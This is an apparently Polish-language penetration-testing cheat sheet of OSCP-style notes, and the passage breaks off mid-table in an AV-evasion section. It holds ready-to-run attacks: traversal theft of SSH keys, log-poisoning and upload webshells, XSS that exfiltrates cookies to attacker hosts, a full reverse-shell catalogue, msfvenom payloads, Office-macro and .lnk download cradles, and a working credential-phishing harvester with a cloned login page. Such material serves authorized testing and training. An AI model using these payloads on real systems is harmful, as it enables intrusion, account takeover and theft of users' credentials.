**Traversal → kradzież klucza SSH → logowanie** (najczęstszy foothold):
```bash
curl 'http://$IP/index.php?page=../../../../../../home/USER/.ssh/id_rsa' -o key   # user+home z /etc/passwd
chmod 400 key                                          # SSH odrzuca 0644 "too open"
ssh -i key -p 2222 USER@$IP                            # port często 2222, nie 22
```

**PHP wrappers (odczyt źródła i RCE):**
```
# Base64 kodowanie źródła PHP (żeby serwer nie wykonał, tylko pokazał)
php://filter/convert.base64-encode/resource=index.php
# RCE przez data:// (jeśli allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
# RCE przez wykonanie payloadu z inputu
php://input   (POST body: <?php system($_GET['c']);?>)
# expect:// (jeśli rozszerzenie expect włączone)
expect://id
```
**Log poisoning → RCE** (wstrzyknij PHP do logu, potem załaduj log przez LFI):
```bash
# 1. Zatruj User-Agent (ten sam snippet działa cross-OS):
curl -A "<?php system(\$_GET['c']); ?>" http://$IP/
# 2. Załaduj log przez LFI + wykonaj (spacje URL-enkoduj jako %20!):
http://$IP/index.php?page=/var/log/apache2/access.log&c=id
#    Windows XAMPP: page=../../../../../xampp/apache/logs/access.log&c=dir
# 3. Reverse shell — system() woła /bin/sh (brak >&) → owiń w bash -c:
#    &c=bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/$LHOST/$LPORT%200>%261"
```
> ⚠️ Log ma teraz 2 snippety → komenda wykona się **2×**. OPSEC: payload zostaje w logu na stałe → zanotuj do cleanup.
**RFI** (gdy `allow_url_include=On`) — serwuj payload u siebie i wskaż URL:
```
http://$IP/index.php?page=http://$LHOST:8000/shell.txt&c=id
```

## 2.5 File Upload bypass

> Cel: wgrać webshell/reverse shell mimo filtrów.
```php
# shell.php — minimalny webshell
<?php system($_GET['cmd']); ?>
```
**Techniki omijania filtrów rozszerzeń:**
```
shell.php  →  shell.phtml / .php3 / .php4 / .php5 / .php7 / .phar / .pht
shell.php.jpg           # double extension (gdy serwer bierze pierwsze)
shell.jpg.php           # gdy bierze ostatnie
shell.php%00.jpg        # null byte
shell.pHp               # mixed case
```
**Content-Type spoofing** (w Burpie zmień na `image/jpeg`) + **magic bytes** (dodaj `GIF89a;` na początku pliku, żeby przeszedł walidację obrazu):
```
GIF89a;
<?php system($_GET['cmd']); ?>
```
`.htaccess` upload (wymuś parsowanie .jpg jako PHP):
```
AddType application/x-httpd-php .jpg
```
> Uploady ASP/ASPX (IIS): `shell.aspx`, `shell.asp;.jpg`. Zawsze sprawdź gdzie ląduje plik (`/uploads/`).

**Upload NIE wykonuje się? → traversal w nazwie pliku → nadpisz `authorized_keys`** (app z własnym web serverem często biegnie jako root):
```bash
ssh-keygen -f fileup; cp fileup.pub authorized_keys
# w Burpie: filename="../../../../../../../root/.ssh/authorized_keys" → Forward (blind — response tylko odbija nazwę)
ssh -p 2222 -i fileup root@$IP                         # nadpisanie authorized_keys włącza SSH roota
```
> **Arsenał webshelli na Kali** (do upload/RFI): `/usr/share/webshells/{php,asp,aspx,jsp}` — np. `php/simple-backdoor.php` → `?cmd=whoami`. Delivery PowerShell przez webshell: `?cmd=powershell -enc <B64>` — pamiętaj **UTF-16LE** (`[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($t))`), nie UTF-8.

## 2.6 Command Injection

> Parametr trafiający do shella. Separatory łańcuchowe:
```bash
; id            # sekwencyjnie
| id            # pipe
|| id           # gdy pierwsza komenda faila
&& id           # gdy pierwsza sukces
` id `          # backticks
$(id)           # command substitution
%0a id          # newline (URL-encoded)
```
**Blind command injection (bez outputu)** — potwierdź OOB:
```bash
ping -c 4 $LHOST                 # nasłuchuj: sudo tcpdump -i tun0 icmp
curl http://$LHOST:8000/$(whoami)   # zobaczysz nazwę w logach http.server
sleep 5                          # time-based potwierdzenie
```

## 2.7 SSTI (Server-Side Template Injection)

> Wykryj: wstrzyknij `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` — jeśli zwróci `49`, silnik szablonów wykonuje kod.

**Jinja2 / Python — RCE:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
> Rozbiór: `self` = obiekt szablonu → `__init__` → `__globals__` (słownik globali) → `__builtins__` (wbudowane funkcje) → `__import__('os')` → `popen('id').read()`.

**Bypass filtrów przez hex** — Python czyta `\x6f\x73` jako `os` (zamień stringi na hex, strukturę `self`/`()` zostaw):
```
'\x6f\x73'  ==  'os'      (o=6f, s=73)
```
**Inne silniki (szybka ściąga):**
```
Twig (PHP):   {{['id']|filter('system')}}
Freemarker:   <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
Ruby ERB:     <%= `id` %>
```
> 🔗 Metodyka i payloady per-silnik: PayloadsAllTheThings / tplmap.

## 2.8 XSS (cookie stealing + exfiltracja)

**Detekcja (najpierw):** wstrzyknij znaki `< > ' " { } ;` — jeśli wracają jako `&lt;`/`%3C` = kodowane (chronione); nieskodowane = XSS.
```html
<script>alert(42)</script>     <!-- unikatowa liczba potwierdza, że TWÓJ inject odpalił -->
```
> Kontekst decyduje: między tagami potrzebujesz `<script>`; wewnątrz istniejącego JS wystarczą `' " ;`. **Sinki:** search, błędy, komentarze/recenzje, oraz nagłówki **User-Agent / X-Forwarded-For** (stored, renderowane w panelu admina — np. WP Visitors plugin). Podmień nagłówek w Burp Repeater; `200 OK` = payload zapisany.

**Stored XSS → nowy admin (gdy cookie ma HttpOnly, nie ukradniesz):** XSS działa W sesji admina → sam pobiera nonce i tworzy konto.
```bash
# JS: GET /wp-admin/user-new.php → regex nonce → POST action=createuser&role=administrator
# minify (jscompress) + char-encode, dostarcz w User-Agent:
curl -i http://target --user-agent "<script>eval(String.fromCharCode(...))</script>" --proxy 127.0.0.1:8080
```
> Nonce chroni przed CSRF, ale nie przed XSS w uwierzytelnionej sesji. `eval(String.fromCharCode(...))` bo `' " &` psują dostarczenie przez nagłówek. Persistent → usuń konto po engagemencie (cleanup + raport).

**Kradzież ciasteczka (base64-encoded payload, żeby ominąć filtry):**
```html
<img src=x onerror=eval(atob('d2luZG93LmxvY2F0aW9uPSdodHRwOi8vMTkyLjE2OC4xODAuNzk6ODAwMC8/Yz0nK2RvY3VtZW50LmNvb2tpZQ=='))>
<!-- atob() dekoduje base64 → window.location='http://ATTACKER:8000/?c='+document.cookie -->
```
Nasłuch: `python3 -m http.server 8000` — ciasteczko wpadnie w parametrze `?c=`.

**Obfuskacja hex/unicode (bypass WAF):**
```html
<iframe src=ja&#x0D;vascript&colon;setTimeout('\x66\x65\x74\x63\x68...')></iframe>
```
**Fetch danych z niedostępnej dla nas ścieżki (SSRF-like przez XSS ofiary):**
```html
<script>
fetch('/internal/secret')
  .then(r=>r.json())
  .then(data=>fetch('http://ATTACKER/logger?data='+btoa(JSON.stringify(data))));
</script>
```

## 2.9 Reverse shells — katalog

> Odpal listener na swojej maszynie **zanim** wywołasz payload: `nc -lvnp $LPORT` (lub `rlwrap nc -lvnp $LPORT` dla historii/edycji).

### Bash
```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```
### Netcat
```bash
nc -e /bin/sh $LHOST $LPORT
# Wersja bez -e (gdy netcat okrojony):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
```
### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$LHOST'",'$LPORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```
### PERL
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### PHP
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
### socat (stabilniejszy, pełny TTY jednym strzałem)
```bash
# Listener (Ty):
socat file:`tty`,raw,echo=0 TCP-L:$LPORT
# Ofiara:
socat TCP:$LHOST:$LPORT EXEC:'bash',pty,stderr,setsid,sigint,sane
```
### xterm (klasyk)
```bash
# Ofiara łączy się z Twoim X-serwerem na TCP 6001:
xterm -display 10.0.0.1:1
# U Ciebie: Xnest :1  oraz  xhost +targetip
```
### PowerShell (Windows) — one-liner
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
> 🔗 Gdy nic nie działa: **https://www.revshells.com** — generator wszystkich powyższych + msfvenom, z podstawianiem IP/portu.

### msfvenom — generowanie payloadów
```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
# Windows EXE (meterpreter)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
# Windows service EXE (do sc.exe)
msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe-service -o myservice.exe
# MSI installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o installer.msi
# PHP webshell
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
```

## 2.10 Webshelle

### Linux — reverse one-liner zrzucany do pliku
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/'$LHOST'/'$LPORT' 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
```
### Windows — pomocnicze
Sprawdź czy webshell wykonuje przez CMD czy PowerShell:
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
Pobranie powercat na maszynę atakującą (do serwowania na Windę):
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

## 2.11 Stabilizacja shella (upgrade do pełnego TTY)

> 🔗 Kompletny przewodnik: https://0xffsec.com/handbook/shells/full-tty/

```bash
# 1. Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# (alternatywy: script /dev/null -c bash   |   /usr/bin/script -qc /bin/bash /dev/null)
# 2. Wciśnij Ctrl+Z (usypia shell)
# 3. Na SWOIM terminalu:
stty raw -echo && fg
# 4. W shellu ofiary przywróć zmienne:
export TERM=xterm; export SHELL=bash
# 5. Dopasuj rozmiar okna (sprawdź `stty size` u siebie):
stty rows 38 columns 116
```

## 2.12 Locating & fixing public exploits

> Zanim uruchomisz cudzy exploit — **przeczytaj kod**. Publiczne PoC bywają celowo złośliwe (ukryty destrukcyjny payload w hex) albo po prostu psują cel. Dekoduj każdy „shellcode”/hex, zanim zaufasz.

### Szukanie
```bash
searchsploit apache 2.4.49                # szukaj po nazwie/wersji
searchsploit -t oracle windows            # -t = tylko w tytule
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
searchsploit -m 42341                     # -m = skopiuj (mirror) do CWD — ZAWSZE przed edycją (update nadpisuje repo!)
searchsploit -p 39446                     # -p = pełna ścieżka + URL exploit-db
searchsploit -s Apache 2.4.49             # -s strict (dokładna wersja) · -e exact tytuł · -w URL · -j JSON · --id
grep -i qdpm /usr/share/exploitdb/files_exploits.csv    # szybki grep po CSV bez GUI
grep -l Exploits /usr/share/nmap/scripts/*.nse          # NSE które REALNIE exploitują (zero pobierania PoC)
```
> **Offline (egzamin):** `sudo apt install exploitdb` PRZED egzaminem — masz tylko lokalne repo. Źródła online: **exploit-db.com**, **github.com** (`site:github.com`), **packetstorm**, **nvd.nist.gov**, **vulners.com**. Preferuj EDB-Verified/RCE nad DoS/surowy GitHub.

### Weryfikacja PoC przed uruchomieniem
```bash
# Ukryty payload w hex? Zdekoduj do czytelnej postaci, ZANIM odpalisz:
python3 -c 'print(bytes.fromhex("726d202d7266"))'    # → pokaże co naprawdę robi „shellcode”
```
> Czerwone flagi w PoC: `rm -rf`, `curl|bash` na obcy host, zaciemniony base64/hex, socket wychodzący poza cel. Testuj w izolowanej VM/wine, nie na swoim Kali produkcyjnym.

### Poprawianie / kompilacja exploitów
```bash
# Cross-kompilacja C dla Windows na Kali:
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32   # -lws2_32 gdy używa Winsock (WSAStartup/socket)
wine exploit.exe                                       # bezpieczny test na Kali
# Regeneracja shellcode dla BOF (podmień zmienną 'shellcode' w PoC):
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread \
  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"         # -b = zakazane znaki (bad chars)
```
> Typowe zmiany w PoC: IP/port atakującego (C: `inet_addr("IP")` / `htons(80)` — PIERWSZE do zmiany), offset, adres powrotu, payload. **64-bit cel:** `x86_64-w64-mingw32-gcc 42341.c -o exp.exe -lws2_32` (i686 = 32-bit).

**BOF — adres powrotu (JMP ESP) little-endian + walidacja modułu:**
```c
unsigned char retn[] = "\x83\x0c\x09\x10";   // adres 0x10090c83 zapisany OD TYŁU (little-endian)
```
> `objdump -d target.dll | grep 'jmp *esp'` (DLL wyciągnięty z celu). Debugger → *View > Executable modules* → potwierdź, że DLL z retn JEST załadowany; **unikaj systemowych DLL** (ASLR). Niezaładowany? → pożycz JMP ESP z siblinga EDB-Verified. **EIP przesunięty o 1 bajt?** off-by-one od null-terminatora (`strcpy` zjada bajt) → zwiększ `initial_buffer_size` o 1 (780→781).

**Web-exploit (Python) — checklist:** HTTP/HTTPS? ścieżka? pre-auth czy creds? GET/POST? → dodaj `verify=False` na **KAŻDYM** `requests.*` (nie tylko pierwszym), zaktualizuj `base_url`+creds z loota. `IndexError: list index out of range` → nazwa parametru CSRF różni się; wstaw `print` PRZED padającą linią, zobacz realną odpowiedź, popraw. Weryfikuj: `curl -k https://$IP/uploads/shell.php?cmd=whoami`.

**Brute formularza z tokenem CSRF (hydra nie umie — patator):**
```bash
patator http_fuzz url=http://$IP/login method=POST \
  body='login[_csrf_token]=_TOKEN_&login[email]=FILE0&login[password]=FILE1' \
  0=emails.txt 1=wordlist.txt before_urls=http://$IP/login \
  before_egrep='_TOKEN_:name="login\[_csrf_token\]"[^>]*value="([^"]*)"' \
  accept_cookie=1 follow=0 -x ignore:clen=116          # rozróżniaj sukces/błąd po Content-Length
```
> `before_urls` pobiera stronę przed KAŻDĄ próbą, `before_egrep` łapie świeży token do `_TOKEN_`, `accept_cookie=1` wiąże token z sesją. Łańcuch: `cewl`→wordlist + emaile z „About Us"→userzy → patator → creds → authenticated RCE.

## 2.13 Metasploit Framework (MSF)

> Framework spinający recon → exploit → post-exploit → pivot. Na OSCP: **limit 1 użycia MSF na maszynę standalone** (przemyśl, gdzie go zużyjesz); w zestawie AD zwykle bez ograniczeń — sprawdź aktualny Exam Guide.

### Start i baza
```bash
sudo msfdb init          # inicjalizacja bazy postgres (raz)
sudo msfconsole          # start
```
```
db_status                # sprawdź połączenie z bazą
workspace -a pen200      # nowy workspace (izoluj projekty)
db_nmap -A $IP           # nmap z zapisem wyników do bazy
hosts                    # hosty w bazie
services -p 445          # usługi (filtr po porcie)
```
### Moduły — search / use / options / run
```
search type:exploit apache 2.4.49
search type:auxiliary smb          # skanery / enum
use 0                              # wybierz po indeksie z ostatniego search
use exploit/windows/smb/psexec     # albo po pełnej nazwie
show options                       # wymagane parametry
set RHOSTS $IP
set LHOST tun0                     # możesz podać interfejs zamiast IP
set LPORT 443
info                               # ZAWSZE przed run: efekty uboczne, stabilność, targets, czy zostawia ślady
check                              # nieintruzywny dry-run — potwierdź podatność ZANIM strzelisz (oszczędza próby)
run                                # lub: exploit   (exploit -j = w tle jako job)
```
> `setg` ustawia zmienną GLOBALNIE (`setg RHOSTS $IP`). `services -p 445 --rhosts` wrzuca hosty z bazy do RHOSTS. `info` → *Module side effects* (ślady w logach/na dysku), *Available targets* (0=Automatic vs in-memory/dropper). Zmień domyślny `LPORT 4444` → 443/80. „This exploit may require manual cleanup of /tmp/..." → **posprzątaj**.

**Auxiliary brute (`ssh_login`) — sam otwiera sesję + zapisuje creds do bazy:**
```
use auxiliary/scanner/ssh/ssh_login
set USERNAME george ; set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS $IP ; set RPORT 2222 ; set STOP_ON_SUCCESS true ; run
creds                              # przechwycone poświadczenia (host+usługa)
```
> W przeciwieństwie do Hydry — udany login OTWIERA sesję. Pamiętaj `RPORT` dla niestandardowych portów. Wzorzec działa dla `smb_login` itd. `smb_version` sam flaguje „SMB Signing Is Not Required".

**Baza — darmowa powierzchnia ataku (tylko przy `db_status` Connected):**
```
vulns          # podatności wywnioskowane z modułów (+ CVE)
creds          # przechwycone poświadczenia
loot ; notes   # pobrane pliki/zrzuty (SAM, /etc/passwd)
```

### Payloady — staged vs non-staged
```
show payloads                      # kompatybilne z wybranym exploitem
set payload windows/x64/meterpreter/reverse_tcp   # staged (meterpreter)
set payload linux/x64/shell_reverse_tcp           # non-staged (zwykły shell)
```
> **Staged** (`/meterpreter/reverse_tcp`) = mały stager dociąga resztę. **Non-staged** (`_reverse_tcp` bez `/`) = cały payload naraz — stabilniejszy przez proxy/tunel.

### Multi/handler — listener pod payload z msfvenom
```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 443
run -j                             # w tle; jobs = lista, kill <id> = zabij
```
### Meterpreter — post-exploitation
```
sysinfo ; getuid                   # kim / gdzie jestem
ps ; migrate <PID>                 # przeskocz do stabilnego procesu (np. explorer.exe)
getsystem                          # próba eskalacji do SYSTEM (Windows)
hashdump                           # dump SAM (po SYSTEM)
load kiwi                          # mimikatz wewnątrz meterpretera
download /etc/passwd               # pobierz plik z celu
upload winpeas.exe C:\Temp\        # wgraj na cel
shell                              # zejście do natywnego shella
background                         # (Ctrl+Z) → wróć do msf, sesja żyje
```
```
sessions -l                        # lista sesji
sessions -i 2                      # wejdź do sesji 2
sessions -u 1                      # UPGRADE zwykłego shella → meterpreter
```
### Local exploity / bypass UAC
```
search UAC
use exploit/windows/local/bypassuac_sdclt
set SESSION 1
run
```
### Pivoting przez MSF (autoroute + SOCKS)
```
use post/multi/manage/autoroute    # dodaj trasy do wewn. podsieci przez sesję
set session 1
run                                # ręcznie: route add 172.16.5.0/24 1
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j                             # SOCKS5 na 127.0.0.1:1080 → proxychains
```
Po dodaniu trasy — skanuj i atakuj wewnętrzne hosty (⚠️ **przez pivot używaj bind, nie reverse** — cel wewn. nie ma trasy powrotnej do Kali):
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200 ; set PORTS 445,3389 ; run
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/bind_tcp     # BIND — nie reverse_tcp!
set SMBUser luiza ; set SMBPass 'Haslo1!'        # user musi być LOCAL ADMIN na celu
# w meterpreterze: portfwd add -l 3389 -p 3389 -r 172.16.5.200  → xfreerdp na 127.0.0.1:3389
# sessions -k <id> zabij · channel -l/-i żongluj shellami · route flush wyczyść trasy
```
### Resource scripts (automatyzacja)
```bash
msfconsole -r handler.rc           # uruchom komendy z pliku (.rc)
# w konsoli: makerc /tmp/setup.rc   # zapisz historię komend jako skrypt
```

## 2.14 Client-side attacks & phishing (koncepcja)

> ⚠️ Tylko w ramach **autoryzowanego** zaangażowania / labu. Cel: skłonić UŻYTKOWNIKA do uruchomienia kodu, gdy nie ma podatnej usługi sieciowej. Wektory: dokumenty z makrami, pliki HTA/LNK, sfałszowane strony logowania.

> 🎯 **Drogowskaz:** 1) **recon celu NAJPIERW** — payload musi pasować do platformy. Znajdź dokumenty (`site:cel filetype:pdf`, `gobuster -x pdf`) → `exiftool -a -u` → Author (pretekst) + Producer (wersja Office). 2) potwierdź OS/przeglądarkę: Canarytoken/Grabify (UA kłamie, ufaj JS-fingerprint). 3) wektor: Office+makro / `.Library-ms`+`.lnk` / phishing creds. 4) infra ZAWSZE przed dostawą: web server + `nc -nvlp 4444`.

### Fingerprinting klienta
```bash
exiftool -a -u brochure.pdf         # Author=pretekst, Producer/Creator=wersja Office; brak "for Mac"=Windows
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x pdf   # znajdź dokumenty (głośne)
# Aktywnie: canarytokens.org (Web bug) / grabify.link → JS-fingerprint OS+przeglądarka (nie ufaj samemu UA)
```
### Makro Office (VBA) — download & execute
> Szkielet: `Sub AutoOpen()` / `Sub Document_Open()` odpalają makro przy otwarciu `.doc`/`.docm` (NIE `.docx`). Makro uruchamia PowerShell z **download-cradle**:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 4444 -e powershell
```
> ⚠️ **Surowy cradle często cicho pada** — zakoduj i potnij (dwa warunki działania `-enc`):
```bash
echo -n 'IEX(New-Object Net.WebClient)...' | iconv -t UTF-16LE | base64 -w0   # -enc przyjmuje TYLKO UTF-16LE!
# limit 255 zn. na LITERAŁ VBA (nie na zmienną) → tnij base64 na kawałki: Str = Str + "..."
python3 -c 's=open("b64.txt").read().strip();n=50;[print(f"Str = Str + \"{s[i:i+n]}\"") for i in range(0,len(s),n)]'
# w makrze: powershell.exe -nop -w hidden -enc <sklejony $Str>
```
> **MOTW / Protected View:** ofiara musi *Enable Editing* (pokona MOTW) → *Enable Content* (odpala makro). Post-2013 Office blokuje makra z netu. **Omijają MOTW:** FAT32, wnętrze 7z/ISO/IMG. Sprawdź: `Get-Content plik.doc -Stream Zone.Identifier`. „Macros in" ustaw na bieżący dokument, nie global template.

### Wektor .Library-ms + .lnk (WebDAV jako lokalny folder)
> `.Library-ms` renderuje zdalny WebDAV jako folder w Explorerze i przechodzi przez filtry blokujące linki. W środku `.lnk` z cradle.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name><version>6</version><isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>
<searchConnectorDescriptionList><searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation><isSupported>false</isSupported>
<simpleLocation><url>http://ATTACKER_IP</url></simpleLocation>
</searchConnectorDescription></searchConnectorDescriptionList></libraryDescription>
```
```bash
# .lnk (target): powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/powercat.ps1');powercat -c ATTACKER_IP -p 4444 -e powershell"
cp automatic_configuration.lnk /home/kali/webdav/     # serwuj powercat.ps1 z OSOBNEGO :8000 (nie z WebDAV — AV)
smbclient //TARGET/share -c 'put config.Library-ms'   # dostawa
```
> `@windows.storage.dll,-34582` (nie `shell32.dll`) omija filtry łapiące „shell32". ⚠️ Po otwarciu Windows przepisuje `url` na `\\IP\DavWWWRoot` → **RESETUJ XML do oryginału przed KAŻDĄ wysyłką**, inaczej ofiara zobaczy pusty share. Nazwij `.lnk` benign (`automatic_configuration`).
> Analiza podejrzanych makr (blue-team / weryfikacja): `olevba dokument.docm`.

### Dostawa payloadu przez WebDAV / HTTP
```bash
sudo apt install python3-wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/   # share WebDAV
python3 -m http.server 80            # albo zwykły HTTP do download-cradle
nc -nvlp 4444                        # listener na reverse shell
```
### Phishing poświadczeń
> Sklonuj stronę logowania, podmień `action` na swój serwer, hostuj, zbieraj dane. `wget` szybko, ale SPA (Vue/CSRFGuard) pada → **single-file** (real Chromium renderuje DOM).
```bash
sudo apt install -y nodejs npm chromium && sudo npm install -g single-file-cli
single-file "https://przyklad.com/signin" signin.html --browser-executable-path /usr/bin/chromium
grep -oP '.{0,100}Next</span>' signin.html        # znajdź id przycisku (np. signin_btn_next) do podpięcia onclick
```
Weaponizacja klonu (BeautifulSoup — usuń cookie-SDK, podłóż krok hasła) + serwer zbierający z **302 misdirection**:
```python
# cred_server.py (:8080) — loguje i odsyła ofiarę na PRAWDZIWY serwis (myśli, że pomyliła hasło):
from http.server import HTTPServer,BaseHTTPRequestHandler; from urllib.parse import parse_qs
class H(BaseHTTPRequestHandler):
  def do_POST(s):
    d=parse_qs(s.rfile.read(int(s.headers.get('Content-Length',0))).decode())
    print(f"[+] {d.get('email',[''])[0]} : {d.get('password',[''])[0]}")
    s.send_response(302); s.send_header('Location','https://zoom.us/signin'); s.end_headers()
HTTPServer(('0.0.0.0',8080),H).serve_forever()
```
```bash
# w signin.html: <form action="http://ATTACKER_IP:8080/creds" method="POST">  (ATTACKER_IP = publiczny IP, nie 127.0.0.1!)
python3 cred_server.py & sudo python3 -m http.server 80    # 2 serwery: zbieracz :8080 + host klonu :80
```
> **Dostawa:** z przejętego webmaila *Reply-all* w trybie HTML (URL ukryty pod „kliknij tutaj") — omija banery [EXTERNAL]. ⚠️ **MFA:** statyczne hasło nie wystarczy → real-time relay/BitM (**evilginx2**, cuddlephish). Wariant bez klonu: wymuś NTLM (`\\ATTACKER_IP\share`) + Responder (§5.4). Zawsze w granicach zgody klienta.

## 2.15 API attacks (REST / JSON)

> Nowoczesne apki mają backend API (`/api/`, `/v1/`, `/rest/`). Enumeruj endpointy, metody i logikę — częste błędy: **mass-assignment**, brak autoryzacji na endpointach admina, **verb tampering**, IDOR/BOLA.

### Enumeracja
```bash
ffuf -u http://$IP:5002/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
curl -i http://$IP:5002/users/v1                 # często zwraca listę userów / strukturę
curl -i http://$IP:5002/users/v1/admin/password  # sprawdź endpointy „admin”
# Wersjonowane ścieżki REST (gobuster pattern file):
printf '{GOBUSTER}/v1\n{GOBUSTER}/v2\n' > pattern
gobuster dir -u http://$IP:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
gobuster dir -u http://$IP:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt   # brute pól usera (email/password)
```
> **Czytaj BODY, nie tylko kod:** `404` z treścią „User not found" wciąż potwierdza istnienie. `405` = endpoint jest, zła metoda (→ verb tampering). Docsy: `/ui` lub `/console` = Swagger. Setup **Burp**: `burpsuite` → proxy `127.0.0.1:8080`, Intercept OFF → HTTP History → *Send to Repeater* (craft/replay) / *Intruder* (brute); `curl ... --proxy 127.0.0.1:8080` wpina curla do Burpa.
### Nadużycia
```bash
# Rejestracja z mass-assignment (dopisz sobie rolę admina przez ukryte pole):
curl -d '{"password":"lab","username":"pwn","email":"pwn@x.com","admin":"True"}' \
  -H 'Content-Type: application/json' http://$IP:5002/users/v1/register
# Logowanie → token (użyj w nagłówku Authorization przy kolejnych żądaniach):
curl -d '{"password":"lab","username":"pwn"}' -H 'Content-Type: application/json' http://$IP:5002/users/v1/login
# Verb tampering — zmień metodę na PUT/DELETE tam, gdzie GET był chroniony:
curl -X PUT -d '{"password":"newpass"}' -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <JWT>' http://$IP:5002/users/v1/admin/password
```
> Sprawdzaj: **IDOR/BOLA** (podmień ID w ścieżce), brak autoryzacji na `/admin/*`, **JWT** (`jwt_tool`, słaby sekret → `hashcat -m 16500`), nadmiarowe pola w JSON. Zawsze `curl -i` — czytaj nagłówki i kody.

## 2.16 AV/EDR evasion — koncepcja (BEZ gotowców)

> ⚠️ Sekcja **wyłącznie teoretyczna** — po co, jak działa detekcja i dlaczego cradle „cicho pada" (§2.14). ŚWIADOMIE bez działających payloadów/injektorów: gotowce evasion nie trafiają do tego playbooka. Do wykrywania tych technik → §11.6. Tylko w ramach autoryzowanego zaangażowania.

> 🎯 **Drogowskaz — dlaczego payload pada i gdzie:** 1) **na dysku** przy zapisie/skanie → detekcja sygnaturowa + statyczna heurystyka. 2) **przy uruchomieniu skryptu** (PowerShell/JS/VBA/makro) → **AMSI** przekazuje treść do AV *już po deobfuskacji*. 3) **w pamięci / przy zachowaniu** → EDR na behawiorze (injection API, nietypowe drzewo procesów, unhooking). Każdy poziom to inny czujnik — „przeszło przez jeden" nie znaczy „przeszło przez wszystkie.
> 💎 **Wniosek praktyczny (OSCP):** zamiast walczyć z AV — najpierw sprawdź, czy w ogóle jest (`Get-MpComputerStatus`), i czy masz autoryzację by go tknąć. Często prostsze: **living-off-the-land** (narzędzia już zaufane w systemie), payload dopasowany do platformy (§2.14 recon), wykonanie w pamięci zamiast pliku na dysku.

**Trzy warstwy detekcji — co realnie patrzy (do zrozumienia, nie do obejścia):**

| Warstwa | Kiedy działa | Na co reaguje |
|---|---|---|
| **Sygnaturowa** | plik ląduje na dysku | znane bajty/hash (np. surowy output msfvenom bez zmian) |
